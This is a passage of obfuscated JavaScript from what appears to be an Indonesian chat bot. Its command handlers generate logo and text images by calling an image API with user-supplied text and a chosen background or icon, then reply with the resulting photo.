_0x1ce978[_0x240d04(0x1eef)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x26f7)+_0x240d04(0x2214)+_0x240d04(0x2070)+'\x0a`')+_0x1ce978[_0x240d04(0xfe4)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x8af)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x849)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['ltvQn'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x26f7)+_0x240d04(0x2214)+'enggunaan:'+'\x0a`')+_0x1ce978[_0x240d04(0x2db8)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x8af)));const _0x382147=['airi-2',_0x1ce978[_0x240d04(0x2e1f)],_0x1ce978[_0x240d04(0x511)],_0x1ce978['ksPTr'],_0x1ce978['lnDou'],_0x1ce978[_0x240d04(0x18e2)],_0x1ce978[_0x240d04(0x2c25)],_0x1ce978['GPOEY'],_0x1ce978[_0x240d04(0x2c75)],_0x1ce978[_0x240d04(0x3d5)],_0x1ce978[_0x240d04(0xb47)],_0x240d04(0x2b1b),_0x1ce978['lqaJa'],_0x1ce978['HcuhY'],_0x1ce978[_0x240d04(0x1aa5)],'raz',_0x1ce978['oBUsb'],_0x240d04(0x9fe),_0x1ce978[_0x240d04(0x508)],_0x1ce978[_0x240d04(0x25e0)],_0x1ce978[_0x240d04(0x170e)],_0x1ce978[_0x240d04(0x838)],_0x1ce978[_0x240d04(0x2b01)],_0x1ce978[_0x240d04(0x2528)],_0x240d04(0xab4),_0x1ce978['BMbvf'],_0x1ce978['ryxEg'],_0x240d04(0x297a),_0x1ce978['CpSKQ'],_0x240d04(0x25cd),_0x240d04(0x18d1),_0x1ce978[_0x240d04(0x22f)],_0x1ce978[_0x240d04(0x148e)],_0x1ce978[_0x240d04(0x17c0)],_0x1ce978['inxVF'],_0x1ce978[_0x240d04(0xb4b)],_0x1ce978[_0x240d04(0x81a)],_0x1ce978[_0x240d04(0x783)],'qi',_0x1ce978['BvXmw'],_0x1ce978[_0x240d04(0x2a3a)],_0x1ce978[_0x240d04(0x1126)],_0x1ce978[_0x240d04(0x2c5)],_0x240d04(0x283e)+'2',_0x1ce978['vcvgK'],_0x1ce978[_0x240d04(0xc71)],_0x240d04(0x216d),_0x1ce978['KSCTc'],_0x240d04(0x1e94),_0x240d04(0xc07),_0x240d04(0x16aa),_0x1ce978[_0x240d04(0x2cff)],_0x240d04(0x8e9),_0x1ce978[_0x240d04(0x3cc)],_0x1ce978[_0x240d04(0xb45)],_0x240d04(0x19cc),_0x240d04(0x1903),_0x1ce978[_0x240d04(0x99b)],_0x240d04(0x12f7),_0x1ce978['xDPas'],_0x1ce978[_0x240d04(0x2ca9)],_0x1ce978[_0x240d04(0xa53)],_0x1ce978['bYBqL'],_0x240d04(0x22d9),_0x1ce978['zNJUl'],_0x1ce978['NknLV'],_0x1ce978[_0x240d04(0xb45)],_0x1ce978[_0x240d04(0x2a53)],_0x1ce978[_0x240d04(0x2c21)],_0x1ce978[_0x240d04(0x21b2)],_0x1ce978['bHMkG'],_0x1ce978['yDEGB'],'nina',_0x1ce978[_0x240d04(0x2254)],_0x1ce978[_0x240d04(0x12ce)],_0x1ce978['qxFHe'],_0x1ce978[_0x240d04(0x1ac8)],_0x240d04(0x2db9),_0x1ce978[_0x240d04(0x2ea)],_0x1ce978['pAuRf'],_0x1ce978[_0x240d04(0x55d)],_0x1ce978['EhOpQ'],_0x1ce978['YdULt'],_0x1ce978[_0x240d04(0x241d)],_0x1ce978[_0x240d04(0xcf9)],_0x1ce978['TlhXJ'],_0x1ce978[_0x240d04(0x2a9d)],_0x1ce978[_0x240d04(0x2c3e)],_0x1ce978[_0x240d04(0x2a53)],_0x1ce978[_0x240d04(0x1095)],_0x240d04(0x1cb8),_0x240d04(0x21f),_0x1ce978['akwEI'],'tel-annas',_0x1ce978[_0x240d04(0x385)],_0x240d04(0x1bf0),'skud',_0x1ce978[_0x240d04(0x159b)],_0x240d04(0x237c),_0x1ce978['gjViR'],_0x1ce978[_0x240d04(0x2882)],_0x240d04(0x1b56),_0x240d04(0x2a7f),_0x1ce978[_0x240d04(0x2e07)]];if(!_0x382147[_0x240d04(0x55c)](_0x345085)){if(_0x1ce978['AVMGc'](_0x1ce978[_0x240d04(0x254a)],_0x240d04(0x2bc4)))_0x1ce978[_0x240d04(0x2c53)](_0x555a99,_0x382147,_0x382147[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x186b)]);else return _0x1ce978[_0x240d04(0x1b00)](_0x1dcb05,_0x1ce978[_0x240d04(0x1453)]);}else{_0x1ce978[_0x240d04(0x18cb)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0xaa97d2=api(_0x1ce978['WtcHl'],_0x240d04(0x1dfb)+_0x240d04(0x1d21)+_0x3e6565,{'text':_0x2b7b14,'text2':_0x83dd4c,'banner':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x3a8f7e=await _0x1ce978[_0x240d04(0x2cb3)](fetch,_0xaa97d2);if(!_0x3a8f7e['ok'])throw await _0x3a8f7e[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0xaa97d2},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0xa2d)]:{if(_0x1ce978['IJEJN'](_0x1ce978['dDekn'],_0x1ce978[_0x240d04(0x10c6)])){const _0x1a51c9={'TSFoJ':function(_0x3c42b6){const _0x5c2835=_0x240d04;return _0x1ce978[_0x5c2835(0x285d)](_0x3c42b6);},'PERQw':function(_0x1e4a7d,_0x247443){const _0x3b6187=_0x240d04;return _0x1ce978[_0x3b6187(0x158f)](_0x1e4a7d,_0x247443);}};return new _0x3868d0((_0x291a6c,_0x502611)=>{const _0x1276b6=_0x240d04;try{delete _0x19e89d[_0x1276b6(0x1a15)][_0x8604e6],_0x1a51c9['TSFoJ'](_0x291a6c);}catch(_0x2df64b){_0x1a51c9[_0x1276b6(0x26f9)](_0x502611,_0x2df64b);}});}else{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['Hgsfi'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978['wEZQs'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'ofc|buffal'+'o`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0xfbd)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x4f9)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+_0x240d04(0xa0c)+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978['UAqzM'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1a8d)+'o`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x17d7)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['mOYWv'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x1ddd)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x1a8d)+'o`'));const _0x3505a0=[_0x1ce978[_0x240d04(0x27cf)],_0x1ce978[_0x240d04(0x28fa)],_0x240d04(0x1c06),_0x1ce978['MOsaz'],_0x1ce978[_0x240d04(0x1cf1)],_0x1ce978[_0x240d04(0x1c81)],_0x1ce978['EVgNd'],_0x1ce978[_0x240d04(0xc3b)],_0x1ce978[_0x240d04(0x102)],_0x1ce978[_0x240d04(0x2f3)],_0x1ce978[_0x240d04(0x263e)],_0x1ce978['rgVDP']];if(!_0x3505a0['includes'](_0x345085)){if(_0x1ce978['ZrBoj'](_0x240d04(0x2179),_0x1ce978[_0x240d04(0x112b)]))_0x1ce978[_0x240d04(0xb74)](_0x555a99,_0x3505a0,_0x3505a0[_0x240d04(0x2b45)],'background');else return _0x4ef524(_0x1ce978[_0x240d04(0x17c4)]);}else{if(_0x1ce978[_0x240d04(0x1e09)](_0x240d04(0x29a6),'HZNdH')){_0x476bfb(lang['wait']);let _0x307143=_0x1ce978['bZPin'](api,_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x243c)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x5b0602=await _0x1ce978[_0x240d04(0x2ee4)](fetch,_0x307143);if(!_0x5b0602['ok'])throw await _0x5b0602['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x307143},{'caption':lang['ok']});}else return _0x1ce978[_0x240d04(0x2418)](_0x456f31,_0x240d04(0x239e)+'u\x20tidak\x20cu'+'kup\x20untuk\x20'+_0x240d04(0xade)+_0x4cd900+_0x240d04(0x2828));}}}break;case'companylog'+'o2':{if(!_0x33cfb1)return _0x1ce978['LseGT'](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+_0x240d04(0xa0c)+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x134e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x178c)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x186c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978['RmRra'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'ofc|3`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c['split']('|')[0x2];if(!_0x345085)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x1edb)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x2c98)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x178c)));const _0x4037f7=['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18'];if(!_0x4037f7[_0x240d04(0x55c)](_0x345085))_0x555a99(_0x4037f7,_0x4037f7[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);else{if(_0x1ce978['wNFCI'](_0x1ce978[_0x240d04(0x29c6)],_0x1ce978['PmnDE']))return _0x486e96['charAt'](0x0)[_0x240d04(0xdd3)+'e']()+_0x6ae0d3['slice'](0x1);else{_0x1ce978[_0x240d04(0x6a1)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x2bcdbf=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x284e)]+_0x3e6565,{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x43675a=await _0x1ce978['nKfYn'](fetch,_0x2bcdbf);if(!_0x43675a['ok'])throw await _0x43675a[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2bcdbf},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x1f3c)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x609)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+'und`\x0a\x0aCont'+_0x240d04(0x1f7a)+'aan:\x0a`')+_0x1ce978[_0x240d04(0xfe4)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|3`'));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x604)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1808)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978['EZBhS'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x178c)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+'und`\x0a\x0aCont'+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978['hfGkX'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x178c)));const _0x56c69b=['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26'];if(!_0x56c69b[_0x240d04(0x55c)](_0x345085))_0x1ce978[_0x240d04(0x295f)](_0x555a99,_0x56c69b,_0x56c69b['length'],_0x240d04(0x2105));else{_0x1ce978[_0x240d04(0x1e24)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x2d43a0=_0x1ce978[_0x240d04(0x15f7)](api,_0x240d04(0x10a),_0x1ce978['sOIOU'](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x4c3728=await _0x1ce978['BZHtt'](fetch,_0x2d43a0);if(!_0x4c3728['ok'])throw await _0x4c3728[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2d43a0},{'caption':lang['ok']});}}break;case _0x1ce978['qYrSF']:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1ef6)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['nArkd'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+'aan:\x0a`')+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+'ofc|3`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x22d5)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x108c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+'und`\x0a\x0aCont'+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978['YBCbm'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|3`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1],_0x345085=_0x58693c['split']('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x3c6)](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x178c)));const _0x257216=['1','2','3','4','5','6'];if(!_0x257216[_0x240d04(0x55c)](_0x345085))_0x1ce978['UPypo']!==_0x240d04(0x190a)?_0x528de8=_0x5de58c[_0x94ca3c]:_0x555a99(_0x257216,_0x257216['length'],_0x1ce978[_0x240d04(0x2a3c)]);else{_0x1ce978[_0x240d04(0x13a4)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x18f8d4=_0x1ce978[_0x240d04(0x1b1b)](api,_0x240d04(0x10a),_0x1ce978[_0x240d04(0x24ff)]('/api/ephot'+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978['EEoOe']),_0x207934=await _0x1ce978['TGBkj'](fetch,_0x18f8d4);if(!_0x207934['ok'])throw await _0x207934['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x18f8d4},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x17ed)]:{if(_0x1ce978[_0x240d04(0x27f1)](_0x1ce978['KISJZ'],_0x1ce978[_0x240d04(0x2b3b)])){if(!_0x33cfb1)return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1127)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2c2)+'Contoh\x20pen'+'ggunaan:\x0a`')+_0x1ce978['QAFdb'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x19be)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1127)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2c2)+_0x240d04(0x19d)+_0x240d04(0x11ad))+_0x1ce978[_0x240d04(0x28e8)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|panda`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x2696)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1537)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2c2)+_0x240d04(0x19d)+_0x240d04(0x11ad))+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x19be)));const _0x390c19=[_0x1ce978['FNHhA'],_0x240d04(0x1798),_0x1ce978['oarem'],_0x1ce978[_0x240d04(0x632)],_0x1ce978[_0x240d04(0xff8)],_0x1ce978[_0x240d04(0x1832)],_0x1ce978['xSHEk'],_0x1ce978[_0x240d04(0x2a96)],_0x1ce978[_0x240d04(0x316)],_0x1ce978[_0x240d04(0x907)],_0x1ce978[_0x240d04(0x1d9c)],'bear',_0x1ce978['wuFEj'],_0x1ce978[_0x240d04(0x28fa)],_0x1ce978[_0x240d04(0x102)],_0x1ce978[_0x240d04(0xe49)],_0x1ce978[_0x240d04(0xcc1)],_0x1ce978[_0x240d04(0x229e)],_0x1ce978['MsrRr'],_0x240d04(0xbb6),_0x1ce978[_0x240d04(0x925)],_0x1ce978[_0x240d04(0x588)],_0x1ce978[_0x240d04(0x20d2)]];if(!_0x390c19[_0x240d04(0x55c)](_0x345085)){if(_0x1ce978['hxPyb'](_0x1ce978[_0x240d04(0x1d80)],_0x1ce978[_0x240d04(0xbc2)]))_0x1ce978[_0x240d04(0x22d8)](_0x555a99,_0x390c19,_0x390c19[_0x240d04(0x2b45)],'icon');else{let _0x24f7d1=_0x1ce978[_0x240d04(0x16c3)]+_0x2cd867[_0x240d04(0x16e6)](([_0x57274e,_0x54caa5])=>_0x5904a8[_0x240d04(0x1fc7)](_0x57274e)+'\x20*'+_0x47974a(_0x57274e)+_0x240d04(0x22de)+(_0x54caa5-_0x57bfb3[_0x57274e]))['join']('\x0a');return _0x20f474(_0x24f7d1);}}else{_0x1ce978[_0x240d04(0x2375)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x417a99=_0x1ce978[_0x240d04(0x1ebf)](api,_0x1ce978[_0x240d04(0x44a)],_0x240d04(0x1dfb)+_0x240d04(0x1d21)+_0x3e6565,{'text':_0x2b7b14,'text2':_0x83dd4c,'icon':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x5af49d=await _0x1ce978['atbhL'](fetch,_0x417a99);if(!_0x5af49d['ok'])throw await _0x5af49d[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x417a99},{'caption':lang['ok']});}}else return _0x1ce978['kBPKG'](_0x91a6c9,_0x1ce978[_0x240d04(0x24a8)]);}break;case _0x1ce978[_0x240d04(0x2b3)]:{if(_0x1ce978[_0x240d04(0x29c3)](_0x1ce978[_0x240d04(0x2662)],_0x1ce978[_0x240d04(0x51c)]))_0x454bc1[_0x240d04(0xd24)]-=0x2dc6c0,_0x5aa665=_0x240d04(0x1c9a)+_0x240d04(0x2734)+_0x240d04(0x2b63)+_0x240d04(0x25cc)+_0x240d04(0xc8e)+_0x240d04(0x1936)+'mbayar\x20den'+_0x240d04(0x1d05)+_0x240d04(0xca7),_0x4419f6=_0x1ce978['GfzEQ'];else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1226)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x61f)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+'und`\x0a\x0aCont'+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978['JzTwI'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|m14ebr'+'`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x260b)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['mubwr'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+'aan:\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x9a3)+'`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x20c6)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x18a9)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0xa1d)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x9a3)+'`'));const _0x13d0d1=[_0x1ce978['ksKee'],_0x1ce978[_0x240d04(0x1bb1)],_0x1ce978[_0x240d04(0xefc)],_0x1ce978[_0x240d04(0x2400)],_0x1ce978[_0x240d04(0x28a2)],_0x1ce978[_0x240d04(0x1fcb)],_0x1ce978[_0x240d04(0x15b3)],_0x1ce978['CWSyg'],_0x1ce978[_0x240d04(0x1bf3)],_0x1ce978[_0x240d04(0x2993)],_0x1ce978[_0x240d04(0x22cc)],_0x1ce978['jveRu'],_0x1ce978[_0x240d04(0x2dd5)],_0x1ce978[_0x240d04(0x2771)],_0x1ce978[_0x240d04(0x10e)],_0x1ce978[_0x240d04(0xaa9)],_0x1ce978[_0x240d04(0x237a)],_0x1ce978['fLJrS']];if(!_0x13d0d1[_0x240d04(0x55c)](_0x345085))_0x555a99(_0x13d0d1,_0x13d0d1[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);else{_0x1ce978[_0x240d04(0x257e)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0xc6b443=_0x1ce978['QxSti'](api,'alfa',_0x1ce978['JzTwI'](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978['EEoOe']),_0x5c30f3=await _0x1ce978['mFeTw'](fetch,_0xc6b443);if(!_0x5c30f3['ok'])throw await _0x5c30f3[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0xc6b443},{'caption':lang['ok']});}}}break;case _0x1ce978['NCdmo']:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1ae8)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1486)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0xafd)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1c13)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['OpqXR'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+'und`\x0a\x0aCont'+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x1012)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1c13)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0xb94)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['kFKCV'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+'aan:\x0a`')+_0x1ce978[_0x240d04(0x1880)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x1c13)));const _0x32365d=[_0x1ce978[_0x240d04(0x113d)],'caroline',_0x1ce978['Cpwwl'],_0x1ce978['LOyKh'],_0x240d04(0xc8b),_0x1ce978[_0x240d04(0x23ca)],_0x240d04(0x1be6),_0x1ce978['WxbIw'],_0x240d04(0x2cbc),_0x1ce978['WOLFM'],'olivia',_0x1ce978['jlyoJ']];if(!_0x32365d[_0x240d04(0x55c)](_0x345085))_0x1ce978['TspAe'](_0x555a99,_0x32365d,_0x32365d[_0x240d04(0x2b45)],_0x240d04(0x2105));else{if(_0x1ce978[_0x240d04(0x1d93)](_0x1ce978[_0x240d04(0x1792)],_0x1ce978[_0x240d04(0x1792)])){_0x1ce978[_0x240d04(0x116b)](_0x476bfb,lang['wait']);let _0x5105e9=api(_0x240d04(0x10a),_0x1ce978[_0x240d04(0x1acb)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x1591f4=await _0x1ce978['zqrqu'](fetch,_0x5105e9);if(!_0x1591f4['ok'])throw await _0x1591f4[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x5105e9},{'caption':lang['ok']});}else return _0xe27f62(_0x240d04(0x239e)+_0x240d04(0x47b)+_0x240d04(0x92c)+_0x240d04(0x1572)+_0x2a4836+'\x20'+_0x1ce978[_0x240d04(0x506)](_0x1f2cf4,_0xf907b9)+('*,\x20tapi\x20ha'+_0x240d04(0x177f)+'*')+(_0x5b8c0f[_0x5d4a61]||0x0)+'*.');}}break;case'letterlogo'+'s':{if(_0x1ce978[_0x240d04(0x1b3e)](_0x1ce978[_0x240d04(0x1029)],_0x1ce978[_0x240d04(0x1029)]))_0x2a4972++;else{if(!_0x33cfb1)return _0x1ce978['fcWiH'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x7b9)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x1547)+_0x240d04(0x97b)+'nggunaan:\x0a'+'`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xe81)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return 